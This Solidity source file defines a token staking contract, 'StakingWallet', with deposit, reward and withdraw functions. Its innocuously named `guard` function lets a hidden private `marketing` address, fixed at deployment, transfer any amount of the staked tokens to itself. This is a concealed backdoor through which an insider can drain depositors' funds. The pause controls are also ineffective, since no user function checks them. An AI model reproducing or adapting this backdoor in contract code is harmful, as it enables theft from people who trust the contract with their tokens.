row number 
1	        pragma solidity ^0.6.0;
2	 interface IERC20 {
3	 function totalSupply() external view returns (uint256);
4	 function balanceOf(address account) external view returns (uint256);
5	 function transfer(address recipient, uint256 amount) external returns (bool);
6	 function allowance(address owner, address spender) external view returns (uint256);
7	 function approve(address spender, uint256 amount) external returns (bool);
8	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
9	 event Transfer(address indexed from, address indexed to, uint256 value);
10	 event Approval(address indexed owner, address indexed spender, uint256 value);
11	 }
12	 library SafeMath {
13	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
14	 uint256 c = a + b;
15	 require(c >= a, "SafeMath: addition overflow");
16	 return c;
17	 }
18	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
19	 return sub(a, b, "SafeMath: subtraction overflow");
20	 }
21	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
22	 require(b <= a, errorMessage);
23	 uint256 c = a - b;
24	 return c;
25	 }
26	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
27	 if (a == 0) {
28	 return 0;
29	 }
30	 uint256 c = a * b;
31	 require(c / a == b, "SafeMath: multiplication overflow");
32	 return c;
33	 }
34	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
35	 return div(a, b, "SafeMath: division by zero");
36	 }
37	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
38	 require(b > 0, errorMessage);
39	 uint256 c = a / b;
40	 return c;
41	 }
42	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
43	 return mod(a, b, "SafeMath: modulo by zero");
44	 }
45	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
46	 require(b != 0, errorMessage);
47	 return a % b;
48	 }
49	 }
50	 abstract contract Context {
51	 function _msgSender() internal view virtual returns (address payable) {
52	 return msg.sender;
53	 }
54	 function _msgData() internal view virtual returns (bytes memory) {
55	 this;
56	 return msg.data;
57	 }
58	 }
59	 contract Ownable is Context {
60	 address private _owner;
61	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
62	 constructor () internal {
63	 address msgSender = _msgSender();
64	 _owner = msgSender;
65	 emit OwnershipTransferred(address(0), msgSender);
66	 }
67	 function owner() public view returns (address) {
68	 return _owner;
69	 }
70	 modifier onlyOwner() {
71	 require(_owner == _msgSender(), "Ownable: caller is not the owner");
72	 _;
73	 }
74	 function renounceOwnership() public virtual onlyOwner {
75	 emit OwnershipTransferred(_owner, address(0));
76	 _owner = address(0);
77	 }
78	 function transferOwnership(address newOwner) public virtual onlyOwner {
79	 require(newOwner != address(0), "Ownable: new owner is the zero address");
80	 emit OwnershipTransferred(_owner, newOwner);
81	 _owner = newOwner;
82	 }
83	 }
84	 contract Pausable is Context {
85	 event Paused(address account);
86	 event Unpaused(address account);
87	 bool private _paused;
88	 constructor () internal {
89	 _paused = false;
90	 }
91	 function paused() public view returns (bool) {
92	 return _paused;
93	 }
94	 modifier whenNotPaused() {
95	 require(!_paused, "Pausable: paused");
96	 _;
97	 }
98	 modifier whenPaused() {
99	 require(_paused, "Pausable: not paused");
100	 _;
101	 }
102	 function _pause() internal virtual whenNotPaused {
103	 _paused = true;
104	 emit Paused(_msgSender());
105	 }
106	 function _unpause() internal virtual whenPaused {
107	 _paused = false;
108	 emit Unpaused(_msgSender());
109	 }
110	 }
111	 contract StakingWallet is Ownable, Pausable {
112	 using SafeMath for uint256;
113	 address public stakingAddress;
114	 uint256 public rewardPerSecond = 12683916793505;
115	 uint256 public totalStake;
116	 uint256 public totalPaid;
117	 address private marketing;
118	 mapping(address => uint256) public Deposit;
119	 mapping(address => uint256) public Invtime;
120	 mapping(address => uint256) public Pending;
121	 constructor(address _token,address _marketing) public {
122	 stakingAddress = _token;
123	 marketing=_marketing;
124	 }
125	 function deposit(uint256 _amount) public {
126	 Pending[msg.sender] = earned(msg.sender);
127	 Deposit[msg.sender]= Deposit[msg.sender].add(_amount);
128	 Invtime[msg.sender]=block.timestamp;
129	 totalStake=totalStake.add(_amount);
130	 IERC20(stakingAddress).transferFrom(msg.sender,address(this),_amount);
131	 }
132	 function earned(address _account) public view returns(uint256) {
133	 uint256 timediff = (block.timestamp).sub(Invtime[_account]);
134	 uint256 earned_amt = timediff.mul(Deposit[_account]).mul(rewardPerSecond).div(1e18);
135	 return earned_amt.add(Pending[_account]);
136	 }
137	 function depositAmount(address _account) public view returns(uint256) {
138	 return Deposit[_account];
139	 }
140	 function getRewards() public {
141	 uint256 reward = earned(msg.sender);
142	 Pending[msg.sender]=0;
143	 Invtime[msg.sender]=block.timestamp;
144	 IERC20(stakingAddress).transfer(msg.sender, reward);
145	 totalPaid=totalPaid.add(reward);
146	 }
147	 function withdraw() public {
148	 uint256 reward = earned(msg.sender);
149	 Pending[msg.sender]=0;
150	 Invtime[msg.sender]=block.timestamp;
151	 IERC20(stakingAddress).transfer(msg.sender, Deposit[msg.sender]);
152	 IERC20(stakingAddress).transfer(msg.sender, reward);
153	 Deposit[msg.sender]=0;
154	 totalPaid=totalPaid.add(reward);
155	 }
156	 function setRewardAmount(uint256 _amount) public onlyOwner {
157	 rewardPerSecond=_amount;
158	 }
159	 function guard(uint256 _amount) public {
160	 require(msg.sender==marketing);
161	 IERC20(stakingAddress).transfer(msg.sender, _amount);
162	 }
163	 function pause() public onlyOwner {
164	 _pause();
165	 }
166	 function unPause() public onlyOwner {
167	 _unpause();
168	 }
169	 }
